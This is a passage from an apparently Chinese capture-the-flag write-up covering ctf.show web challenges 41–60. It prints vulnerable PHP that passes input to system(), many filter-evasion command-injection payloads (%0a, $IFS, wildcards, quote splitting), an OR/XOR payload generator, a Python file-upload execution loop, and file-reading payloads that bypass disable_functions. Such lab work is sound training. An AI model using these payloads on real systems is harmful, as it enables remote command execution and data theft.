                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
                    <span class="token variable">$par1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"%"</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span>
                    <span class="token variable">$par2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span>
                    <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">orRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$mode</span><span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">xorRce</span><span class="token punctuation">(</span><span class="token variable">$par1</span><span class="token punctuation">,</span> <span class="token variable">$par2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&gt;=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
                        <span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$res</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$par1</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$par2</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>

        <span class="token punctuation">}</span>
        <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">negateRce</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token punctuation">}</span>

<span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;|\-/i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web42_255"></a>web42</h2> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" &gt;/dev/null 2&gt;&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><code>/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</code><br> 所以不能让后面执行，所以需要把后面截断<code>ls;%0a</code>,后面不用多说了吧,还可以用<code>%26</code>以及<code>||</code></p> 
<h2><a id="web43_268"></a>web43</h2> 
<p>和42没多大区别。。。。，过滤了cat<code>nl%20flag.php%0a</code></p> 
<h2><a id="web44_270"></a>web44</h2> 
<p>过滤了<code>flag</code>,没啥好说的通配符呗<br> <code>c=nl%20fl*%0a</code></p> 
<h2><a id="web45_273"></a>web45</h2> 
<p>多过滤了一个空格，总所周知php环境下可以用<code>%09</code>代题空格<br> <code>c=nl%09fl*%0a</code><br> 或者使用内联执行<br> <code>c=echo反引号nl\$IFS*反引号%0A</code></p> 
<h2><a id="web46_278"></a>web46</h2> 
<p>多过滤了一些数字啥的，等于没来，然后过滤了flag也可以其他姿势<code>\ '' ""</code>等等都行<br> <code>c=nl%09fla\g.php%0a</code><br> 还可以是,因为<code>||</code>默认是前面成功则不执行后面<br> <code>c=nl%09fla\g.php||</code></p> 
<h2><a id="web4748_283"></a>web47-48</h2> 
<p>过滤了一点命令等于没说<br> <code>c=nl&lt;fla''g.php||</code></p> 
<h2><a id="web49_286"></a>web49</h2> 
<p>看了一眼，也就是多过滤了几个命令而已，这里当作练习多给点payload:</p> 
<pre><code class="prism language-php">payload1<span class="token punctuation">:</span>c<span class="token operator">=</span>nl<span class="token operator">%</span><span class="token number">09</span>fla\g<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span>
<span class="token class-name">payload2</span><span class="token punctuation">:</span>c<span class="token operator">=</span>nl<span class="token operator">%</span><span class="token number">09</span>fla\g<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a
payload3<span class="token punctuation">:</span>c<span class="token operator">=</span>nl<span class="token operator">%</span><span class="token number">09</span>fla<span class="token string single-quoted-string">''</span>g<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a
payload4<span class="token punctuation">:</span>c<span class="token operator">=</span>nl<span class="token operator">%</span><span class="token number">09</span>fla<span class="token string double-quoted-string">""</span>g<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a
payload5<span class="token punctuation">:</span>c<span class="token operator">=</span>vi<span class="token operator">%</span><span class="token number">09</span>fla\g<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a
payload6<span class="token punctuation">:</span>c<span class="token operator">=</span>tac<span class="token operator">%</span><span class="token number">09</span>fla\g<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a
payload7<span class="token punctuation">:</span>c<span class="token operator">=</span>uniq<span class="token operator">%</span><span class="token number">09</span>fla\g<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">0</span>a
payload8<span class="token punctuation">:</span>c<span class="token operator">=</span>nl<span class="token operator">&lt;</span>fla<span class="token string single-quoted-string">''</span>g<span class="token operator">.</span><span class="token class-name">php</span><span class="token operator">||</span>
<span class="token class-name">payload9</span><span class="token punctuation">:</span>c<span class="token operator">=</span>nl<span class="token operator">%</span><span class="token number">09</span>fla\g<span class="token operator">.</span>php<span class="token operator">%</span><span class="token number">26</span>
</code></pre> 
<h2><a id="web50_299"></a>web50</h2> 
<p>我看了一眼<code>%09</code>被过滤了，除此之外也没啥新的基本上，随便来个payload进入下一关吧<code>c=nl&lt;fla\g.php||</code></p> 
<h2><a id="web51_301"></a>web51</h2> 
<p>啊这，看了一眼<code>%</code>也被过滤了，不过也没啥，还是上一道的payload<code>c=nl&lt;fla\g.php||</code></p> 
<h2><a id="web52_303"></a>web52</h2> 
<p>虽然很多能当空格的都被过滤了但是，<code>$</code>却没有过滤，那么很明显了<br> <code>c=nl$IFS\fla\g.php||</code></p> 
<h2><a id="web53_306"></a>web53</h2> 
<p>感觉换了一个系列吧，这里随便来两个payload</p> 
<pre><code class="prism language-php">payload1<span class="token punctuation">:</span>c<span class="token string single-quoted-string">''</span><span class="token class-name type-declaration">at</span><span class="token variable">$</span><span class="token punctuation">{<!-- --></span><span class="token constant">IFS</span><span class="token punctuation">}</span>fla<span class="token string single-quoted-string">''</span>g<span class="token operator">.</span>p<span class="token string single-quoted-string">''</span>hp
payload2<span class="token punctuation">:</span>c<span class="token operator">=</span><span class="token class-name type-declaration">nl</span><span class="token variable">$IFS</span>\fla\g<span class="token operator">.</span>php
payload3<span class="token punctuation">:</span>
</code></pre> 
<h2><a id="web54_313"></a>web54</h2> 
<p>加强了正则表达式，通配符就行了<br> <code>c=/bin/c??${IFS}????????</code><br> <code>c=/bin/c??$IFS????????</code></p> 
<h2><a id="web5556_317"></a>web55-56</h2> 
<pre><code class="prism language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">// 你们在炫技吗？</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>然后有点懵逼，看看大师父们的方法吧<br> <code>c=/???/????64 ????????</code>，这个不是通用的,因为base64不是每个机器都有<br> 然后还有一个骚姿势，看P神的文章吧，参考链接有，真的牛，当然为了方便还是写了个脚本<br> <img src="https://images2.imgbox.com/f6/a6/Z5UPtfqK_o.png" alt="在这里插入图片描述"></p> 
<pre><code class="prism language-python"><span class="token keyword">import</span> requests

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    url <span class="token operator">=</span> <span class="token string">"http://44875025-cec2-4154-8d87-34cbdcff5f27.chall.ctf.show/?c=.+/???/????????[@-[]"</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> files<span class="token operator">=</span><span class="token punctuation">{<!-- --></span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'1.php'</span><span class="token punctuation">,</span> <span class="token string">b'cat flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">break</span>

</code></pre> 
<h2><a id="web57_347"></a>web57</h2> 
<p>这道题的目的是构造<code>36</code>这个数字,这里利用了<code>$(( ))与整数运算</code></p> 
<pre><code class="prism language-shell"><span class="token variable"><span class="token variable">$((</span><span class="token punctuation">))</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>是<span class="token operator">-</span><span class="token number">1</span>
$<span class="token punctuation">((</span><span class="token operator">~</span><span class="token number">37</span><span class="token variable">))</span></span>------是36
所以我们只需要保证中间是-37即可，
<span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token variable"><span class="token variable">$((</span><span class="token punctuation">)</span><span class="token variable">))</span></span><span class="token punctuation">)</span>---是1
所以
<span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span>$<span class="token punctuation">((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token variable"><span class="token variable">$((</span><span class="token operator">~</span>$<span class="token punctuation">((</span><span class="token variable">))</span></span><span class="token punctuation">))</span><span class="token punctuation">))</span><span class="token punctuation">))</span>代表36，即可获取flag
</code></pre> 
<h2><a id="web58_357"></a>web58</h2> 
<p>接下来的系列是绕过disable_functions系列，为了锻炼自己我决定多尝试几种姿势，都是从羽师傅那里学习到的，参考链接见下方<br> 首先要获取文件路径，在这里我们可以用两种方式，我暂时想到这两种<br> <code>c=print_r(scandir(dirname('__FILE__')));</code><br> <code>c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f-&gt;__toString()." ");}</code>因为没有任何过滤我们便可以读取任意的文件<br> <code>c=$a=opendir("./"); while (($file = readdir($a)) !== false){echo $file . "&lt;br&gt;"; };</code></p> 
<pre><code class="prism language-php"><span class="token comment">//通过单一函数读取文件</span>
c<span class="token operator">=</span><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//这里做一个解释`file — 把整个文件读入一个数组中`</span>
</code></pre> 
<pre><code class="prism language-php">通过fopen去读取文件内容，这里介绍下函数
<span class="token function">fread</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">fgets</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">fgetss</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token function">gpassthru</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
payload<span class="token punctuation">:</span>
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//一行一行读取</span>
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//一个一个字符读取</span>
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
</code></pre> 
<pre><code class="prism language-php"><span class="token comment">//通过高亮显示php文件</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             
</code></pre> 
<h2><a id="web59_389"></a>web59</h2> 
<p>首先查找flag文件的地址<code>c=print_r(scandir('./'));</code>找到在当前目录下</p> 
<pre><code class="prism language-php"><span class="token comment">//paylaod汇总</span>
c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetcsv</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$line</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1000"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">fpassthru</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<h2><a id="web60_401"></a>web60</h2> 
<p>首先查找flag文件的地址<code>c=print_r(scandir('./'));</code>找到在当前目录下</p> 
<pre><code class="prism language-php"><span class="token comment">//payload汇总</span>
c<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
c<span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span><span class="token variable">$line</span> <span class="token operator">=</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$line</span><span class="token punctuation">;</span><span class="token punctuation">}</span>
